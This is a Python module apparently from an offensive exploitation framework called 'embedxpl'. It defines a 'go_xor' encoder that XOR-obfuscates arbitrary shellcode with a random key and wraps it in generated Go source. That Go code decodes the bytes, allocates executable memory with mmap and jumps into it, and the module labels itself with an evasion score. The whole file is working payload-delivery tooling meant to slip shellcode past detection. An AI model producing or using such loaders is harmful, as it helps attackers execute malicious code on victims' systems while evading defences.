"""Go XOR encoder — gera código Go com payload XOR-encoded."""

import os
from embedxpl.core.exploit.encoder import BaseEncoder


class Encoder(BaseEncoder):
    name        = "go/go_xor"
    description = "Encodes payload as Go source with XOR decode + syscall exec"
    arch        = ["x64", "arm64"]
    platform    = ["linux", "windows"]
    evasion_score = 6

    options = {}

    def encode(self, payload: bytes) -> bytes:
        key = os.urandom(1)[0]
        xored = bytes(b ^ key for b in payload)
        hex_bytes = ",".join(f"0x{b:02x}" for b in xored)
        go_src = f'''package main
import ("syscall";"unsafe")
func main() {{
    key := byte(0x{key:02x})
    sc := []byte{{{hex_bytes}}}
    for i := range sc {{ sc[i] ^= key }}
    addr, _, _ := syscall.Syscall(syscall.SYS_MMAP, 0, uintptr(len(sc)),
        syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
        syscall.MAP_ANON|syscall.MAP_PRIVATE, 0, 0)
    for i, b := range sc {{ *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b }}
    syscall.Syscall(addr, 0, 0, 0)
}}'''
        return go_src.encode()
